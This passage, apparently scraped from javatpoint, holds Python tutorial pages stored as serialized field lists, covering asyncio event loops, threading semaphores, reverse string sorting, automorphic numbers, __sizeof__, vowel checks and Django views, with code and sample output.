now.', 'The original and main purpose of Python (x,y) software is to help all the scientific programmers and project developers who were using compiled languages or interpreted languages to make them switch to Python. Python (x,y) is scientific developments oriented Python distribution software is based on the Spyder and Qt interfaces. In Python (x,y) all the programmers using complied programming language also appreciated reusing their code ""as is"" by wrapping it in the software so that we can directly call them in the Python scripts.', ""As we all must be aware of testing all libraries, grabbing all the free documentation present on the internet and choosing the right one (library as well as documentation) takes a lot of time. Moreover, we also need some deep perspective to elaborate the coherent development framework of its own i.e., Python development environment and its libraries. That's where the need for Python (x,y) emerged in scientific development."", 'PyQt is a very easy-to-use library and very powerful and therefore we strongly recommend the use of it for GUI (Graphical User Interface) Development. Many scientific programs and developments such as 2D matplotlib graphic figures etc., can easily be embedded in PyQt application windows and it is very easy as MATLAB.']",[],[],[],"[""|||We can perform tasks of simple functional programming (Programming language have MATLAB-like syntax) as well as tasks of powerful object-oriented programming with the help of Python (x,y) software.|||We can even do clusters using parallel Python while working with Python (x,y).|||From the simplest Python script to the most sophisticated application, we can do scientific project developments for all using the Python (x,y) software.|||Because of its Qt's Graphical User Interface and Spyder scientific development environment, we can easily do scientific project developments with it.|||Using Python (x,y) software, we can do various interactive calculations which include symbolling maths and 2-D (Two-dimensional) as well as 3-D plotting of graphs.|||We can even do parallel computing on multi-processor or multi-core computers using Python (x,y).|||Other than all the above-mentioned tasks, we can even do many more things with Python (x,y) software...|||||||||||||||IDL is a registered trademark of ITT Visual Information Solutions and MATLAB is a registered trademark of The MathWorks.|||We can directly see the interfaces of Spyder and Qt GUI in Python (x,y) software in the plugin page of the software.|||To download the Python (x,y) software and look at its plugins, we can directly go to its official website given on GitHub or can download it using the following link:|||https://python-xy.github.io/downloads.html||||||Users who want to install or uninstall many Python packages present in their device can do it simply by clicking on a single button provided by Python (x,y) software.|||Python (x,y) also provides a quick user guide about how to get started with Python, Spyder, and Qt interfaces.|||Python (x,y) can collect development environment tools as well as scientific-oriented Python libraries.|||With the help of Python (x,y) software, we can collect almost all free related documentations.|||Python (x,y) software provides us all-in-one set-up program which makes it easy for all users to set up it on their devices.||||||To do the rapid prototyping using IPython (The enhanced Python shell)|||Development of small and big projects (application-like projects) using environment provided by Spyder IDE (Integrated Development Environment).|||For many scientific development purposes such as:||||||Numerical simulations,|||Image processing physics (experimenting as well as modeling),|||Signal processing,|||Scientific computing,|||Scientific engineering development etc.|||||||||Python is an open-source and free scientific language.|||Python is easily embeddable, extensible, and portable.|||Python is a fundamentally object-oriented programming language.|||It is also a general-purpose language e.g., I/O (Input & output) rich features, has many database libraries, is easily available on the internet, has a very powerful GUI, and so on.|||&&&|||Numerical simulations,|||Image processing physics (experimenting as well as modeling),|||Signal processing,|||Scientific computing,|||Scientific engineering development etc.|||""]"
281,['Python Event-Driven programming'],"['In this tutorial, we will learn about Event-Driven programming and the Python module (Asyncio) that we can use to do Python Event-Driven programming.']","['https://www.javatpoint.com/python-semaphore', 'https://www.javatpoint.com/python-x-y-software', 'https://www.javatpoint.com/python-semaphore', 'https://www.javatpoint.com/python-x-y-software', 'https://www.javatpoint.com/python-semaphore']",[],[],"['Event-Driven programming', 'Asyncio- Python Event-Driven programming module']","['The event loop', 'Futures', 'Coroutines', 'Tasks', 'Transports', 'Protocols']",[],"['Look at the following flow chart of event loops to understand the working of events in event-driven programming:', 'In the asyncio module of Python, following the different concepts are used while doing event-driven programming:', 'Example: Look at the following Python program with event loops in it:', 'Explanation:', 'We have first imported the asyncio module in the program to use the event loops methods.', 'There are some major differences between the concurrent.futures.Future and asyncio.futures.', 'Explanation:', 'The concept of coroutines inside the asyncio module is very similar to the concept of coroutine in the thread object from the threading module.', 'This concept of coroutines in the asyncio module is the generalization form of the subroutine concept.', 'In asyncio module coroutines, we can use the following two ways that will help us to implement the coroutines in the program:', ""Let's understand both ways by using their implementation in a Python program."", '1. @asyncio.coroutine decorator', 'Example: Look at the following Python program:', 'Explanation:', '2. async def function()', 'Example: Look at the following Python program:', 'Explanation:', 'Explanation:', 'We used the sleep() function of the time module to give a break of 2 seconds after printing every executed coroutine.', 'In the asyncio transport class, the following types of transports can be inherited in the program from the base transport class:', 'Following are the three classes of protocols:']","[""Other than this, it depends upon the program's event loops that always listen to a new incoming event in the program. Once an event loop starts in the program, then only the events will decide what will execute and in which order."", 'The asyncio module was added into Python in version 3.4, and it is available on all the later versions of Python. Asyncio module provides a very good infrastructure for writing concurrent code as single-threaded using the coroutines in the program.', ""Let's learn about all these different concepts used by the asyncio module in detail and understand how they work while doing event-driven programming."", 'In the asyncio module, we have some methods by which we can manage the event loop in the code. Following are such methods are provided in the asyncio module.', 'Now, we will look at a Python program in the following example where we will use the event loop method, i.e., get_event_loop() method. By using this method, we will print the command we give inside the event.', ""After that, we have defined a default function where we gave 'loop' as a parameter and print command inside the function. We used the stop() method from event loops to stop the event."", 'Future classes given in the asyncio module are compatible with the concurrent.futures methods. The future class given in the asyncio module represents the computation from the program, which is yet to be accomplished.', 'Now, we will look at a Python program in the following example, where we will use the future class methods from the asyncio module and print the text in the output.', ""We have first defined a default function, i.e., 'myFunction', with future as a parameter. Inside the function, we used the sleep() method as a two-second pause for the execution."", 'We can implement the coroutines inside the program by utilizing the generators with the asyncio module decorator, i.e., @asyncio.coroutine decorator. We can understand this implementation of coroutine with decorator through the following example.', 'We can say that the async def function() is the most generalized method for implementing the coroutines by the asyncio module. We can understand this method of implementing coroutines with def function() through the following example.', 'We have imported asyncio and time modules in the program to use its functions. Then, we used an async default function to set the task of printing processed coroutines.', ""Then, we used another async default function to set the loop over tasks in it. After completing loops, the function will print 'task completed.' In last, we used the event loop method for running and closing the loop in the program."", 'In all the above-mentioned inherited transport classes, only the following distinct types of methods are subsequently transient from the base transport class:']","['Eventually, the flow of a program depends upon the events, and programming which focuses on events is called Event-Driven programming. We were only dealing with either parallel or sequential models, but now we will discuss the asynchronous model. The programming model following the concept of Event-Driven programming is called the Asynchronous model. The working of Event-Driven programming depends upon the events happening in a program.', 'The event loop is a functionality of the asyncio module used to handle all the events happening in a computational program. Event loops act like round the way while the execution of the whole program is happening, and it also keeps track of the executed and new incoming events. One of the major advantages of the asyncio module is that it allows only a single event loop per process.', 'After that, we used the get_event_loop() method on the loop parameter to print the text from the default function. Then, in the call_soon() event loop method, we used the function name and parameter of a function as arguments. In last, we used run_forever() and close() event loops methods.', 'Then, we gave the text which we want to print in the result using future class methods. We used the get_event_loop method from the event loop in the program. Then, we used the future() class method on the future parameter given in the default function.', 'Now, we can print the text in the output as we have used the future in it. To print the text in the output, we have used the try and finish method, wherein the try method, we have called the printing command, and in the finish method, we closed the loop using the close() method.', ""We can even suspend a coroutine during the program's execution so that the suspended coroutine will wait for external processing given by the user. The suspended coroutine will return to where it had last suspended only after the external processing was done completely."", ""We have used the @asyncio.coroutine decorator after importing the asyncio module. Then, we used a default function to use the coroutine method to get the text. After that, we used the get_event_loop() method from the event loop to print the text in the output. Last, we used the 'try and finally' method on the default function and closed the loop in the program using the close() function."", 'Like the first way of implementing coroutines, we have followed the same path in this method too. In this method, instead of using a decorator and then defining the default function for coroutines, we have directly used the async def operationCoroutine() function of the asyncio module to implement coroutines.', 'Tasks is a subclass given in the asyncio module responsible for executing asyncio coroutines inside an event loop in a parallel manner of execution. We can understand the working of tasks subclass by using a Python program to execute coroutines with it.', 'Transports are the classes provided to us in the asyncio module, and we can use them to implement various types of communication in the program. The transport classes are not thread-safe, and we always have to pair them with a protocol instance after the communication channel is established.', 'In the asyncio module, we are provided with several base classes which we can use to implement our network protocols in the subclasses. We can use such classes in conjunction with transport classes. The protocol will ask for the outgoing data and parses the incoming data, whereas the transport class is responsible for the buffering and actual I/O.']","['# Importing asyncio module in the program', 'import asyncio', '# A default function with event loops method', 'def loopText(loop):', '# A text printing command', ""print('Printing this text through the event loop')"", 'loop.stop() # Stopping the loop', 'loop = asyncio.get_event_loop() # Using get_event_loop() method to print the text', 'loop.call_soon(loopText, loop) # Using call_soon() method from event loops', 'loop.run_forever() # run_forever() on event loop', 'loop.close() # Closing the loop', '# Importing asyncio module in the program', 'import asyncio', '# A default function from the async module using future parameter in it', 'async def myFunction(future):', 'await asyncio.sleep(2) # Using sleep() function of asyncio module', ""future.set_result('This text is printed using future class methods!') # Printing text from future parameter"", '# Using get_event_loop() method from event loop', 'loop = asyncio.get_event_loop()', 'future = asyncio.Future() # Using future() class method', '# Calling default function from future class method', 'asyncio.ensure_future(myFunction(future))', '# Using try & finally method future parameter of function', 'loop.run_until_complete(future)', 'print(future.result()) # printing result from future class', 'finally:', 'loop.close() # finally closing the loop', '# Importing asyncio module in the program', 'import asyncio', '# Using @asyncio.coroutine decorator to implement coroutines', '@asyncio.coroutine', '# Using a default function with coroutine implementation', 'def operationCoroutine():', 'print(""This text is present inside the coroutine of the asyncio module!"") # Printing text inside coroutine', 'loop = asyncio.get_event_loop() # Using get_event_loop() method to print text', 'loop.run_until_complete(operationCoroutine()) # Using run_until_complete() loop method on default function', 'finally:', 'loop.close() # closing the loop', '# Importing asyncio module in the program', 'import asyncio', '# Using async def function() to implement coroutines', 'async def operationCoroutine():', 'print(""This text is present inside the coroutine of the asyncio module!"") # Printing text inside coroutine', 'loop = asyncio.get_event_loop() # Using get_event_loop() method to print text', 'try:     loop.run_until_complete(operationCoroutine()) # Using run_until_complete() loop method on default function', 'finally:', 'loop.close() # closing the loop', '# Importing asyncio module in the program', 'import asyncio', '# Importing time module', 'import time', '# Using async default function()', 'async def Task_ex(n):', 'time.sleep(2) # sleep() function of time module', 'print(""Loop event is processing coroutine no: {}"".format(n)) # given printing tasks to print in output', '# Generating tasks with async default function', 'async def Generator_task():', '# looping over tasks using for loop', 'for i in range(10):', 'asyncio.ensure_future(Task_ex(i))', '# After completing loop', 'print(""All given tasks are completed"")', 'asyncio.sleep(2)', 'loop = asyncio.get_event_loop() # printing in output using event loop method', 'loop.run_until_complete(Generator_task()) # Running the loop', 'loop.close() # Closing the loop']","['Printing this text through the event loop', 'This text is printed using future class methods!', 'This text is present inside the coroutine of the asyncio module!', 'This text is present inside the coroutine of the asyncio module!', 'Loop event is processing coroutine no: 0', 'Loop event is processing coroutine no: 1', 'Loop event is processing coroutine no: 2', 'Loop event is processing coroutine no: 3', 'Loop event is processing coroutine no: 4', 'Loop event is processing coroutine no: 5', 'Loop event is processing coroutine no: 6', 'Loop event is processing coroutine no: 7', 'Loop event is processing coroutine no: 8', 'Loop event is processing coroutine no: 9', 'All given tasks are completed']",[],"[""|||The event loop|||Futures|||Coroutines|||@asyncio.coroutine decorator|||Tasks|||Transports|||and Protocols||||||time() - We can use this method to return the current time to the user, according to the internal clock present in the event loop.|||loop = get_event_loop() - By using this method, we will get the event loop in return according to the current context executing in the program.|||call_soon(CallbackFunction, ArgumentGiven) - With this function, we can arrange that a callback function will be called as soon as possible. The callback function given in the argument will be called when the control returns to the event loop and after call_soon() returns.|||call_later(time_to_delayed, CallbackFunction, ArgumentGiven) - Using this method, we can arrange that the callback function given in the method will be called after the time delay (in seconds) we provided.|||new_event_loop() - Using this method, we can create and return a new event loop project.|||set_event_loop() - With the help of this method, we can set the event loop for the current context executing from the program to the loop.|||run_forever() - By using the loop.run_forever() method in the program, we can run a loop until the stop() method is called.||||||The callback function that we have registered in the future class with the add_done_callback() method will always be called only through the call_soon() method from the event loop.|||The exception() and result() methods from the future class will not take a timeout or time given argument, and they will show an error in the output when the future isn't done yet on these functions.|||We cannot use asyncio.futures.Future class with the as_completed() or wait() functions present in the concurrent.futures package as it is not compatible with them.|||&&&|||@asyncio.coroutine decorator|||async def function()||||||Datagram transport: Datagram transport is an interface that we use for sending the data.|||Read Transport: Read transport is an interface for the transport classes with only read-only mode.|||Write Transport: This transport is an interface for the inherited transport classes with only write-only mode.||| Base Subprocess transport: The base Subprocess transport class functions very similarly to the base transport class.||||||is_closing(): This method will return true only if the given transport class in the argument is already closed on is closing now.|||close(): This method is used to close the current transport class running in the program.|||get_protocol(): We can use the get_protocol() method in the transport class to get the current protocol in return.||| get_extra_info(className, default = none): We can use this method to get some additional information about the transport class we gave in the argument.||||||Protocol class: It is the base class in protocols, and we can use it for implementing streaming protocols to use with the SSL and TCP transports.|||Datagram protocol class: It is another base class in protocols that we can use for implementing the datagram protocols to use with the UDP transports.|||Subprocess protocol class: We can use this base class from protocols to implement various protocols for communicating the child processes using a set of unidirectional pipes.|||""]"
282,['Python Semaphore'],"['In the following tutorial, we will understand the multi-threading synchronization with the help of Semaphore in Python.']","['https://www.javatpoint.com/python-sorted-reverse', 'https://www.javatpoint.com/python-event-driven-programming', 'https://www.javatpoint.com/python-sorted-reverse', 'https://www.javatpoint.com/python-event-driven-programming', 'https://www.javatpoint.com/python-sorted-reverse']",[],[],"['Understanding the Semaphore', 'Understanding the Python Semaphores', 'Methods of creating a Semaphore object']",['Syntax:'],[],"['Let us begin with understanding Python Semaphore.', 'Now let us understand the semaphores in the Python programming language.', 'Let us consider the following syntax in order to create an object of Semaphore.', 'Explanation:', 'The syntax for the same is shown below:', 'The syntax for the same is shown below:', 'Let us consider the following example to understand the complete concept properly.', 'Explanation:']","[""In the above syntax, the object_name is the object of the Semaphore class. The 'count' parameter of the Semaphore class is the number of Threads allowed to access simultaneously. The default value of this parameter is 1."", ""Case 2: In the following case, an object of the Semaphore class can be accessed by 'n' Threads at a time. The remaining Threads have to wait until releasing the semaphore.""]","['Whenever the acquire() function is executed by a Thread, the value of the ""count"" parameter will be decremented by one. Whenever the release() function is executed by a Thread, the value of the ""count"" parameter will be incremented by one. This statement implies that whenever we call the acquire() method, the ""count"" parameter value will be decremented, whereas on calling the release() method, the ""count"" parameter value will be incremented.', 'Case 1: In the following case, we do not specify the argument within the Semaphore class while creating an object. Thus, the value of the count variable is 1 because of which only a thread is permitted to access. This case is the exact copy of the Lock concept.', 'In the above snippet of code, we have imported the required modules and created an object for the Semaphore class with a count value of 4. We have then defined a function using the acquire() function on the object. We have then used the for-loop to iterate the value to 6. We have then called the release() function and created multiple threads. At last, we have called the threads using the start() function.']","['object_name = Semaphore(count)', 'object_name.Semaphore()', 'object_name.Semaphore(n)', '# importing the modules', 'from threading import *', 'import time', '# creating thread instance where count = 3', 'my_obj = Semaphore(4)', '# creating instance', 'def show(the_name):', '# calling acquire method', 'my_obj.acquire()', 'for n in range(6):', ""print('Javatpoint, ', end = '')"", 'time.sleep(1)', 'print(the_name)', '', '# calling release method', 'my_obj.release()', '', '# creating multiple thread', ""thread_1 = Thread(target = show , args = ('Thread 1',))"", ""thread_2 = Thread(target = show , args = ('Thread 2',))"", ""thread_3 = Thread(target = show , args = ('Thread 3',))"", ""thread_4 = Thread(target = show , args = ('Thread 4',))"", ""thread_5 = Thread(target = show , args = ('Thread 5',))"", ""thread_6 = Thread(target = show , args = ('Thread 6',))"", '# calling the threads', 'thread_1.start()', 'thread_2.start()', 'thread_3.start()', 'thread_4.start()', 'thread_5.start()', 'thread_6.start()']","['Javatpoint, Javatpoint, Javatpoint, Javatpoint, Thread 1', 'Thread 3', 'Thread 4', 'Thread 2', 'Javatpoint, Javatpoint, Javatpoint, Javatpoint, Javatpoint, Javatpoint, Thread 1', 'Thread 5', 'Javatpoint, Javatpoint, Thread 6', 'Thread 3', 'Thread 4', 'Javatpoint, Javatpoint, Thread 2', 'Javatpoint, Javatpoint, Thread 5', 'Javatpoint, Thread 1', 'Javatpoint, Thread 3', 'Javatpoint, Thread 6', 'Thread 2', 'Thread 4', 'Javatpoint, Javatpoint, Javatpoint, Thread 5', 'Javatpoint, Thread 1', 'Javatpoint, Thread 3', 'Javatpoint, Thread 6', 'Thread 2', 'Javatpoint, Javatpoint, Thread 4', 'Javatpoint, Thread 5', 'Javatpoint, Thread 1', 'Thread 3', 'Javatpoint, Javatpoint, Thread 2', 'Thread 6', 'Javatpoint, Javatpoint, Thread 4', 'Javatpoint, Thread 5', 'Javatpoint, Thread 1', 'Thread 3', 'Thread 2', 'Thread 6', 'Javatpoint, Thread 4', 'Thread 5', 'Thread 6']",[],"['|||A semaphore is a synchronization construct.|||Semaphore offers threads with synchronized access to a restricted amount of resources.|||A semaphore can be considered as a variable that reflects the amount of currently existing resources. For instance, there are several slots available on a particular level in a parking lot of a shopping mall that is a semaphore.|||The semaphore value cannot be less than zero and greater than the total number of the existing resources.|||The semaphore is linked with two operations - acquire and release.|||When one resource among them is synchronized using a semaphore is ""acquired"" by a thread, the semaphore\'s value is decremented.|||When one resource among them is synchronized using a semaphore is ""release"" by a thread, the semaphore\'s value is incremented.|||The concept of semaphore is created by the Dutch computer scientist named Edsger Dijkstra.|||The two operations of the semaphore, namely acquire and release, are denoted as p and v, respectively by Dijkstra, where p and v are the first letters of the Dutch words proberen and vehogen.|||The word proberen represents the test, whereas vehogen represents the increment in Dutch.||||||A class of the threading module is used to implement the concept of semaphore in Python. This class is known as the Semaphore|||The Semaphore class consists of a constructor, and two functions, acquire() and release(), respectively.|||The acquire() function is used to decrease the count of the semaphore in case the count is greater than zero. Else it blocks till the count is greater than zero.|||The release() function is used for increasing the count of the semaphore and waking up one of the threads waiting on the semaphore.|||']"
283,['Python sorted reverse'],"['We have sorted() function in Python, and we can use it to sort strings given in input. But what if we have to do reverse sorting of the input string. Can we use this sorted() function to sort in reverse? The answer is Yes. In this tutorial, we will learn how we can use the sorted() function to do reverse sorting of the input string.']","['https://www.javatpoint.com/automorphic-number-in-python', 'https://www.javatpoint.com/python-semaphore', 'https://www.javatpoint.com/automorphic-number-in-python', 'https://www.javatpoint.com/python-semaphore', 'https://www.javatpoint.com/automorphic-number-in-python']",[],[],['The sorted() function for reverse sorting of string'],['Method 2: With the help of join() + sorted() + reverse key:'],"['Method 1: With the help of sorted() + reduce() + lambda:', 'Note: We can use this function in Python 2.x versions only. This is because reduce() function is removed from the Python 3.x versions and will throw an error if we run on Python having 3.x versions.']","['In both the methods mentioned above, we will go through an example program to understand the implementation of these methods.']",[],"[""In Python, strings are immutable data types, and that's why it becomes very difficult for us to do reverse sorting of strings. But, with the help of the sorted() function, we can easily perform the task of reverse sorting of strings. For doing reverse sorting with the sorted() function, we can use the following methods:"", 'We can perform the reverse sorting of strings by using a combination of reduce() and lambda function with sorted() function. In this method, after operating the input string in reverse order, we will join the resultant reverse sorted characters list using the lambda function.', 'By using the combination of join() function and reverse key with sorted() function, we can do the task of reverse sorting very easily in two steps. In the first step of operation, we will get the list of reverse sorted characters, and in the second step, we join these characters to get the reverse sorted string as a result.']","['# Taking an input string', 'inputString = input(""Give an input string for reverse sorting: "")', '# Reverse Sorting the input string', 'resultantString = reduce(lambda x, y: x + y, sorted(inputString, reverse = True)) # reverse sorting with using sorted() + reduce() + lambda function', '# printing reverse sorted string in output as result', 'print(""The input string after reverse sorting is: "" + str(resultantString))', '# Taking an input string', 'inputString = input(""Give an input string for reverse sorting: "")', '# Reverse Sorting the input string', ""resultantString = ''.join(sorted(inputString, reverse = True)) # reverse sorting with using sorted() + join() function with reverse key"", '# printing reverse sorted string in output as result', 'print(""The input string after reverse sorting is: "" + str(resultantString))']","['Give an input string for reverse sorting: JAVATPOINT', 'The input string after reverse sorting is: VTTPONJIAA', 'Give an input string for reverse sorting: JAVATPOINT', 'The input string after reverse sorting is: VTTPONJIAA']",[],['|||With the help of sorted() + reduce() + lambda|||With the help of join() + sorted() + reverse key|||']
284,['Automorphic Number in Python'],['A number is said to be an automorphic number if the last digits of the square of this number give the same number.'],"['https://www.javatpoint.com/sizeof-in-python', 'https://www.javatpoint.com/python-sorted-reverse', 'https://www.javatpoint.com/sizeof-in-python', 'https://www.javatpoint.com/python-sorted-reverse', 'https://www.javatpoint.com/sizeof-in-python']",[],[],['Using While loop'],[],[],"['The following are the examples of automorphic numbers-', '1. Input: 25', 'Output - Yes, it is an automorphic number.', 'Reason - The square of 25 gives 625, since the last digits are 25 it is an automorphic number.', '2. Input: 14', 'Output - No, it is not an automorphic number.', 'Reason - The square of 14 gives 196, since the last digits are 96 it is not an automorphic number.', '3. Input: 76', 'Output - Yes, it is an automorphic number.', 'Reason - The square of 76 gives 6776, since the last digits are 76 it is an automorphic number.', 'Since the concept is clear to us now, let us see how we can build the logic to check whether a number is automorphic or not.', 'We know that the modulus operator can be used to perform functions on the digits of a number.', 'The following illustrates how it can be done in Python.', ""So, let's have a glance at the step-by-step approach of the same-"", 'Let us see what happens when we pass the numbers that we discussed in the example.', 'Since 25 is an automorphic number, it displays the required message.', 'Output - 2', 'Since 14 is not an automorphic number, it displays the required message.', 'Output - 3', 'The next approach to do the same is as follows-', 'Let us understand the steps we have followed in this program-', 'So, in this article, we learned what an automorphic number is and how we can check whether a given number is automorphic or not using Python.']",[],[],"['num = int(input(""Enter a number you want to check: \\n""))', '#calculating the number of digits', 'num_of_digits = len(str(num))', '#computing the square of a number', 'square = num**2', '#obtaining the last digits', 'last_digits = square%pow(10,num_of_digits)', '#comparing the digits of number with input', 'if last_digits == num:', 'print(""Yes, {} is an automorphic number"".format(num))', 'print(""No, {} is not an automorphic number"".format(num))', 'print(""Enter the number you want to check:"")', 'num=int(input())', 'square=num*num', 'flag=0', 'while(num>0):', 'if(num%10!=square%10):', 'print(""No, it is not an automorphic number."")', 'flag=1', 'break', 'num=num//10', 'square=square//10', 'if(flag==0):', 'print(""Yes, it is an automorphic number."")']","['Enter a number you want to check:', '76', 'Yes, 76 is an automorphic number', 'Enter a number you want to check:', '25', 'Yes, 25 is an automorphic number', 'Enter a number you want to check:', '14', 'No, 14 is not an automorphic number', 'Enter the number you want to check:', '25', 'Yes, it is an automorphic number.']",[],"['|||The first step will be to take the number from the user and calculate its square.|||We can calculate the number of digits by using the len function.|||The next thing is to calculate the square of a number.|||Now, we will make use of the power function and modulus operator to obtain the last digits.|||Finally, we will compare the last digit with the input number.|||On executing the program, the desired output will be displayed.||||||The first step remains the same, that is, to take the number from the user and calculate its square.|||We have declared a while loop which will execute till the number becomes zero.|||Now we will compare whether the units digit of a number is equal to the unit place of the number obtained after computing the square.|||If the above condition is satisfied, then we will go for the floor division of the number and the squared number.|||On executing the program, it displays whether the number is an automorphic number or not.|||']"
285,['sizeof in Python'],"['When we are writing large scripts or code of many lines, memory management should be our utmost priority. Therefore, we should have good knowledge of handling memory efficiently in addition to good programming knowledge. We have many functions given in Python to get the size in memory of a particular object present in the program, and one of such functions is __sizeof__(). In this tutorial, we will learn about __sizeof__() function and its working inside a Python program.']","['https://www.javatpoint.com/class-based-views-vs-function-based-views', 'https://www.javatpoint.com/automorphic-number-in-python', 'https://www.javatpoint.com/class-based-views-vs-function-based-views', 'https://www.javatpoint.com/automorphic-number-in-python', 'https://www.javatpoint.com/class-based-views-vs-function-based-views']",[],[],['Python __sizeof__() function'],['Example 2:'],[],"['To understand this, let us look at the following example program with an endless generator object.', 'Example 1: Look at the following Python program:', 'Explanation:', ""Let's look at one more example where we use the __sizeof__() function to get the internal memory size without any overhead."", 'Explanation:']","['Using the __sizeof__() function, we can clearly see that the internal memory size of an empty list is 40 bytes and every element present in the list adds 8 bytes size to the total memory size of the list.']","[""The __sizeof__() function in Python doesn't exactly tell us the size of the object. It doesn't return the size of a generator object as Python cannot tell us beforehand that how much size of a generator is. Still, in actuality, it returns the internal size for a particular object (in bytes) occupying the memory."", 'We have used a default function, i.e., endlessGenerator(), to create an endless generator object in the program. In the function, we have initialized a variable, i.e., counting = 0. We have used a while loop on the counting variable without giving a breakpoint on the loop. By creating an infinite loop in the function, we have made the default function as an endless generator object. Finally, we have printed the internal memory size of the endless generator object by using the __sizeof__() function.', ""Now, we can clearly understand the functioning of __sizeof__() function. As the endless generator object in the above program doesn't have any end or breakpoint, Python can't tell us the size of the generator beforehand. But at the same time, we can check the internal memory size allotted to the generator object by __sizeof__() function as it must be occupying some internal memory in Python.""]","['# A default function with endless generator object in it', 'def endlessGenerator():', '# A counting variable to initialize the generator', 'counting = 0', '# Using while loop to create an endless generator', 'while True:', 'yield counting', 'counting += 1 # Creating infinite loop', '# Printing memory size of a generator object', 'print(""Internal memory size of endless generator object: "", endlessGenerator.__sizeof__())', '# Define an empty list in the program', 'emptyList = []', '# Printing size of empty list', 'print(""Internal memory size of an empty list: "", emptyList.__sizeof__())', '# Define some lists with elements', 'a = [24]', 'b = [24, 26, 31, 6]', 'c = [1, 2, 6, 5, 415, 9, 23, 29]', 'd = [4, 5, 12, 3, 2, 9, 20, 40, 32, 64]', '# Printing internal memory size of lists', 'print(""Memory size of first list: "", a.__sizeof__())', 'print(""Memory size of second list: "", b.__sizeof__())', 'print(""Memory size of third list: "", c.__sizeof__())', 'print(""Memory size of fourth list: "", d.__sizeof__())']","['Internal memory size of endless generator object:  120', 'Internal memory size of an empty list:  40', 'Memory size of first list:  48', 'Memory size of second list:  104', 'Memory size of third list:  104', 'Memory size of fourth list:  136']",[],[]
286,['Python Program for accepting the strings which contains all vowels'],"['In this tutorial, we will discuss how a Python program can accept only the string which contains every vowel.']","['https://www.javatpoint.com/python-basic-programs', 'https://www.javatpoint.com/python-basic-programs', 'https://www.javatpoint.com/python-basic-programs', 'https://www.javatpoint.com/python-basic-programs', 'https://www.javatpoint.com/python-basic-programs']",[],[],[],"['Solution Approach', 'Method 1:', 'Method 2:', 'Method 3:', 'Conclusion']",[],"['Explanation:', 'Explanation:', 'Explanation:']","['In the following example, we pass a string to check whether all the vowels are present or not. We have considered that both upper case and lowercase vowels are acceptable. That is ""A"", ""E"", ""I"", ""O"", ""U"" or ""a"", ""e"", ""i"", ""o"", ""u"".', 'The above program will check the inserted string characters, and if the character matches the vowel character, it will add it to the string_1 set, and if the character is not a vowel, it will pass to the next.', 'Then we have put the condition that if the length of string_1 is not equal to the length of vowel_1, the string will not be accepted. But if the length of string_1 is equal to the length of vowel_1, it will accept the string.', 'In the above code, we have use the condition that if the 0 is present in the vowel count array, the string will not be accepted. But if 0 is not present and the string contains all the vowels, the string will be accepted.', ""In the above code, we have use the condition that if the string's length is greater or equal to the length of the vowel_1, that is, 5, and contains all the vowels. Then it will accept the string; otherwise, it will not accept the string.""]","['At first, we will create a set of vowels by using the set() function. Then we will check whether each character of the string is a vowel or not. If the character is a vowel, we will add it into the set ""string_1"". After coming out of the loop, we will check the length of the set ""string_1"". The string will only be accepted if the length ""string_1"" set is equal to the length of the ""vowel_1"" string; otherwise, it will not accept the string.', 'In this tutorial, we have shown how to write a Python program for accepting the string which contains all the vowel characters. The users can also use the same code for different types of conditions for particular characters. We have explained different methods for the same.']","['Input string1: AEIaeiytstwI', 'Output: Not Accepted', ""Reason: All vowels except 'o' and 'u' are not present in the Input string1"", 'Input string2: AbCdEfHiMnOtUv', 'Output: Accepted', 'Reason: All vowels are present.', 'def check(string):', 'string = string.lower()', '# The set() function will be used for converting ""aeiou"" string into set of', '#characters', 'vowel_1 = set(""aeiou"")', '# The set() function will convert the empty dictionary into an empty set', 'string_1 = set({})', '# The we will loop through each character of the string', 'for character_1 in string:', '# Now, it will check if the character is present inside the ""vowel_1"" set or', '#not.', '# If the characters are present, then it will add into the ""string_1"" set by', '#using ""add"" method', 'if character_1 in vowel_1 :', 'string_1.add(character_1)', 'else:', 'pass', '', '# Then, it will check if the length of ""string_1"" set is equal to the length of', '# ""vowel_1"" set or not.', 'if len(string_1) == len(vowel_1) :', 'print (""The string is Accepted"")', 'else :', 'print (""The string is Not Accepted"")', '# Driver code', 'if __name__ == ""__main__"" :', 'string = str (input (""Enter the String of characters: ""))', '# Calling function', 'check(string)', 'def check(string):', 'string = string.replace(\' \', "" "")', 'string = string.lower()', ""vowel_1 = [string.count('a'), string.count('e'), string.count("", ""'i'), string.count('o'), string.count('u')]"", '# If 0 is present in vowel count array', 'if vowel_1.count(0) > 0:', ""return('The string is Not Accepted')"", 'else:', ""return('The string is Accepted')"", '# Driver code', 'if __name__ == ""__main__"":', 'string = str (input (""Enter the String of characters: ""))', 'print (check(string))', 'def check(string):', 'if len (set (string.lower()).intersection(""aeiou"")) >= 5:', 'return (""The string is Accepted"")', 'else:', 'return (""The string is Not Accepted"")', '# Driver code', 'if __name__ == ""__main__"":', 'string = str (input (""Enter the String of characters: ""))', 'print (check(string))']","['#1', 'Enter the String of characters:  aideiofguhs', 'The string is Accepted', '#2', 'Enter the String of characters:  aideiofghs', 'The string is Not Accepted', 'Enter the String of characters: ""aiD"" \'OeiUo\' fg ""FGu"" hs', 'The string is Accepted', 'Enter the String of characters: \'aidE\' ""I"" \'eiIOo\' ""fgHYK"" \'hs\'', 'The string is Not Accepted', 'Enter the String of characters: gIrwi aTheDy uKmtR wmsof', 'The string is Accepted', 'Enter the String of characters:  aidc Eie iIOof gH YKhs', 'The string is Not Accepted']",[],[]
287,['Difference Between Class-based views and Function-Based Views'],['Django is one of a most popular framework for the web development. The reason of its popularity is that it provides the many built-in features that save lots of time of a developer. If you are beginners then it will take some time to understand the flow to the project. But once you get some experience then you can easily understand the execution of features.'],"['https://www.javatpoint.com/how-to-handle-cookies-in-django', 'https://www.javatpoint.com/sizeof-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/django-mvt', 'https://www.javatpoint.com/https://www.javatpoint.com/django-tutorial', 'https://www.javatpoint.com/how-to-handle-cookies-in-django', 'https://www.javatpoint.com/sizeof-in-python', 'https://www.javatpoint.com/how-to-handle-cookies-in-django']",[],[],"['Requirements of Django Views', 'Function-based Views', 'Class Based Views', 'Django Generic Class-Based View', 'Conclusion']","['Advantages of Function Based Views', 'Disadvantages of Function Based Views', 'Advantages of Class Based Views', 'Disadvantages of Class Based Views']",[],"['Below are the points that we should remember about the Django views.', ""Let's have a detailed explanation of way of creating views."", 'The advantages of FBV are given below.', 'The cons of FBV are given below.', ""Let's understand the following implementation of FBV."", ""Let's understand the following pros and cons of the views in Python."", 'Below are the advantages of the class based views.', 'Below are the disadvantages of the class based views.', ""Let's see the implementation of the class 